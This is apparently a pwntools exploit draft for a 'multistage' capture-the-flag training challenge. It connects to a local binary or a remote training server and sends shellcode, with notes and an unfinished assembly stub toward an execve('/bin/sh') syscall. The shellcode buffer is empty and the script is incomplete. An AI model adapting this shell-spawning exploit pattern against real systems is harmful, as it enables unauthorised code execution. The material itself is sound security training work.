from pwn import *

COMMANDS = """
"""
shellcode = b""


#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
if args.GDB:
    p = gdb.debug("./multistage" , gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./multistage")
p.send(shellcode)
p.interactive()

#0x40116e

#execve("/bin/sh\0", NULL, NULL)

#(rdi, rsi, rdx), r10, r8, r9
#const char *filename, const char *const *argv, const char *const *envp

0x7ffeeec9e500

c = """
push 0x3b
pop rax
xor esi, esi
xor edx, edx
syscall
"""